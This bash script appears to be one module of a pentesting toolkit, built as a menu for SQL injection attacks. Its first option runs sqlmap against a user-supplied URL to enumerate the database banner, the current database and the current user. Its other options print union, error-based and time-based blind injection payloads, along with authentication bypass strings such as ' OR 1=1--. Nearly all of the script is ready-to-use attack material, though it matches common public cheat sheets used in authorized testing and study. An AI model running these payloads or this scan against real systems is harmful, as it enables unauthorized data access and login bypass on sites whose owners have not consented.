#!/bin/bash
# HackTricks Ref: sql-injection
# Module: SQL Injection (Hibrid: Automated + Manual Cheat Sheet)

echo -e "${C6}[WEB ATTACK: SQL_INJECTION_FINAL]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Approach:${NC}"
echo "1) Automated Scan (sqlmap)"
echo "2) Manual Payloads (Blind/Union/Error)"
echo "3) Auth Bypass Quick-List"
echo "0) Exit"

read -p "Selection: " sqli_opt

case $sqli_opt in
    1)
        echo -ne "${C5}Enter Target URL: ${NC}"
        read target_url
        echo -e "\n${C4}[*] Running sqlmap (Banner, DB, Users)...${NC}"
        sqlmap -u "$target_url" --batch --banner --current-db --current-user --random-agent --level=2 --risk=1
        ;;
    2)
        echo -e "\n${C2}[*] Manual Injection Reference:${NC}"
        echo -e "--- ${C5}Union-Based (MySQL)${NC} ---"
        echo "  ' ORDER BY 1-- -"
        echo "  ' UNION SELECT 1,2,database(),user()-- -"
        echo -e "--- ${C5}Error-Based (MSSQL/Postgre)${NC} ---"
        echo "  ' AND 1=CONVERT(int,@@version)--"
        echo "  ' AND 1=CAST((SELECT version()) AS int)--"
        echo -e "--- ${C5}Time-Based (Blind)${NC} ---"
        echo "  ' AND SLEEP(5)-- - (MySQL)"
        echo "  ' AND (SELECT 1 FROM PG_SLEEP(5))-- (Postgre)"
        echo "  ' AND 1=(SELECT COUNT(*) FROM DOMAIN_USERS) (Heavy Query)"
        ;;
    3)
        echo -e "\n${C2}[*] Authentication Bypass Payloads:${NC}"
        echo " - admin' --"
        echo " - ' OR 1=1--"
        echo " - admin' AND '1'='1"
        echo " - \") OR (\"1\"=\"1"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
